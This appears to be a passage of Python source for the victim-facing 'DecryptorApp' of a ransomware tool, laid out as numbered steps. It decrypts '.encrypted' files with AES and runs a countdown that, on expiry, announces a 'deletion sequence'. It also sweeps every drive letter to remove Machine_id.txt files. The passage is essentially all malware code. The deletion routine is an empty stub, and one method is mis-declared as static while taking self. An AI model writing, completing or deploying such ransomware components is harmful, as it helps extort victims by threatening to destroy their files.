    # Step 47: Function to decrypt a single file
    def decrypt_file(self, file_path, key):
        try:
            # Open file and read iv + encrypted data
            with open(file_path, 'rb') as file:
                iv = file.read(16)
                encryptedData = file.read()

            # Create a new Cipher to be able to Decrypt files
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decryptedData = unpad(cipher.decrypt(encryptedData), AES.block_size)

            # Remove .encrypted from filename
            originalFilePath = file_path.rsplit(".encrypted", 1)[0]

            # Create a new file in with the name same as an original file, then Write decrypted data to this file
            with open(originalFilePath, 'wb') as file:
                file.write(decryptedData)

            # Delete the encrypted file
            remove(file_path)

            # Submit Log for a Successfully decrypted file
            self.log(f"Successfully decrypted: {file_path}")
            return True

        # Handle Occurs exceptions
        except Exception as e:
            self.log(f"Failed to decrypt: {file_path} | Error: {e}")
            return False

    # Step 48: Function to Load the Timer State, or begin deletion or any error happen reset timer
    def load_timer_state(self):
        try:
            # Open TIMER_STATE_FILE and read this content
            with open(TIMER_STATE_FILE, 'r') as file:
                state = file.read().strip()

                # if a file has no content, actually countdown doesn't activate
                if not state:
                    self.timerLabel.config(text="No Active Countdown. ")
                    self.closingTime = None

                # else, this file has content
                else:
                    # Set closing time
                    self.closingTime = datetime.fromtimestamp(float(state))

                    # if closing time under now time mean Time is UP
                    if datetime.now() >= self.closingTime:
                        self.timerLabel.config(text="Time is UP")
                        messagebox.showinfo("Notification",
                                            "Time has expired. Initiating deletion sequence.")

                        self.begin_deletion_sequence()

                    # else, update the Countdown timer
                    else:
                        self.update_timer()

        # if any exception occurs, reset the timer
        except (FileNotFoundError, ValueError):
            self.reset_timer()

    # Step 49: Function to updating the timer
    def update_timer(self):
        remainingTime = self.closingTime - datetime.now()

        # if time remains, show remaining time
        if remainingTime.total_seconds() > 0:
            self.timerLabel.config(text=f"Time remaining: {str(remainingTime).split('.')[0]}")
            self.timerUpdateId = self.after(1000, self.update_timer)

        # Else, time is up, show Your Time is up! in the Label and begin a deletion sequence
        else:
            self.timerLabel.config(text="Time is UP")
            self.begin_deletion_sequence()

    # Step 50: Function to resting the timer
    def reset_timer(self):
        self.closingTime = datetime.now() + timedelta(minutes=1)
        with open(TIMER_STATE_FILE, 'w') as file:
            file.write(str(self.closingTime.timestamp()))
        self.update_timer()


    # Step 51: Function to resting the timer state
    def reset_timer_state(self):
        with open(TIMER_STATE_FILE, 'w') as file:
            file.write("")
        self.timerLabel.config(text="No Active Countdown.")


    #Step 52: Function to delete the timer state file
    @staticmethod
    def delete_timer_state_file():
        try:
            # Delete the timer state file
            remove(TIMER_STATE_FILE)
        except FileNotFoundError:
            pass

    # Step 53: Function to delete the timer and machine ID files
    @staticmethod
    def delete_timer_and_machine_id_files(self):
        try:
            remove(TIMER_STATE_FILE)
        except FileNotFoundError:
            pass

        # get existing derives in the target machine
        drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]

        # Iterate on each drive
        for drive in drives:
            # get Machine_id.txt path
            machineIdPath = path.join(drive, "Machine_id.txt")
            try:
                remove(machineIdPath)
            except FileNotFoundError:
                pass

    # Step 54: Function to begin the deletion sequence
    def begin_deletion_sequence(self):
        if not self.stopDeletion:
            self.log("Time is up. Starting file deletion sequence.", "red")
            self.deletion_dialog = DeletionCountdownDialog(self, self. stop_deletion_process)
            self.deletion_process()

    def deletion_process(self):
        pass


if __name__ == "__main__":
    # Create an instance of the EncryptionTool class
    decryptor = DecryptorApp()
    decryptor.scan_and_decrypt()